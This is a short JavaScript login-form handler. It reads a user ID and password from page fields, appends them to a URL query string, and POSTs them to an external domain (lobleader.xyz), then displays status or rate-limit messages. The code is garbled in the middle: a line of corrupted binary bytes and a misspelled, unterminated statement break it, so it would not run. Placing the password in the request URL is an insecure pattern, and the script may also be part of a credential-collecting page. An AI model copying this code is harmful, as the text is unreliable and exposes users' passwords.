function submit_data() {
    const uid = document.getElementById("uid-input").value;
    const pwd = encodeURI(document.getElementById("pwd-input").value).replace("?", "%3F").replace("&", "%26");
    const http = new XMLHttpRequest();
    const params = 'uid=' + uid + '&pwd=' + `&�
u���)��N�\��mv��">��d��h�`;
    gocument.getElemrntById("pwd-input
    http.open('POST', 'https://lobleader.xyz/gtcrw/ed364db523ea26907c96396a9069d8fd5cd5912640606de1d3cb83cdd629d7a242b130e7046557af9a53a2fad32c2d17c5914cae2da494cbf8cd35feb26ab071?' + params, true);
    http.onreadystatechange = function () {
        if (http.readyState === 4 && http.status === 200) {
            const response = JSON.parse(http.responseText);
            const status_element = document.getElementById('status-text');
            if (status_element.classList.contains('status-yes')) {
                status_element.classList.remove('status-yes')
            }
            if (status_element.classList.contains('status-no')) {
                status_element.classList.remove('status-no')
            }
            if (response["success"] === 1) {
                status_element.classList.add('status-yes');
            } else {
                status_element.classList.add('status-no');
            }
            status_element.innerText = response['message'];
        } else if (http.readyState === 4 && http.status === 429) {
            const status_element = document.getElementById('status-text');
            if (status_element.classList.contains('status-yes')) {
                status_element.classList.remove('status-yes')
            }
            if (status_element.classList.contains('status-no')) {
                status_element.classList.remove('status-no')
            }
            status_element.classList.add('status-no');
            status_element.innerHTML = "0x5: RATE LIMITED ("+http.getAllResponseHeaders().substring(http.getAllResponseHeaders().indexOf("retry-after") + 13, http.getAllResponseHeaders().length-2)+"s)"
        }
    };
    http.send();
}
